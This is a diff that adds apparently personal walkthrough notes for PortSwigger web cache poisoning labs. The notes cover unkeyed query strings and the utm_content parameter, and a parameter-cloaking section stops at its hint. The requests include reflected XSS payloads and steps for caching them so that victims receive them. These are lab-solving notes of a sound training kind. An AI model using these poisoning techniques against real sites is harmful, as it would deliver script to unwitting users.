@@ -516,3 +516,55 @@ send both stages, one after the other and wait for the victim to load the poison
 https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
 
 
+# ***1. Lab: Web cache poisoning via an unkeyed query string***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query
+
+To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser. 
+
+Hint:
+
+    If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.
+    Although you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the Param Miner extension to automatically add a cache buster header to your requests.
+
+1. find XSS
+turn **Add Dynamic Cachebuster** on in param-miner settings
+find reflection in **GET /?test HTTP/1.1**:
+
+    <link rel="canonical" href='//0a2b004503a049d7c0e6105b00170073.web-security-academy.net/?test&r61bjikry3=1'/>
+
+test basic XSS payload:
+    GET /?'><script>alert(1)</script> HTTP/1.1
+    Host: 0a2b004503a049d7c0e6105b00170073.web-security-academy.net
+
+get a POP
+
+turn **Add Dynamic Cachebuster**  off and cache the XSS (wait to age 35 and send request couple of times. when request with XSS payload yields a hit = the payload is cached. wait for victim to POP
+
+# POP
+
+# ***2. Lab: Web cache poisoning via an unkeyed query parameter***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param
+
+ To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser. 
+
+Hint: Websites often exclude certain UTM analytics parameters from the cache key.
+
+try (typcly exluded from cache key)**utm_content** parameter, along with basic XSS payload and syntax breaking prefix:
+
+    GET /?utm_content='><script>alert(1)</script> HTTP/1.1
+    Host: 0af8005f03fd7940c0541f1f0004006a.web-security-academy.net
+
+# POP
+
+
+# ***3. Lab: Parameter cloaking***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking
+
+To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser. 
+
+Hint: The website excludes a certain UTM analytics parameter
+
+
+
+
+
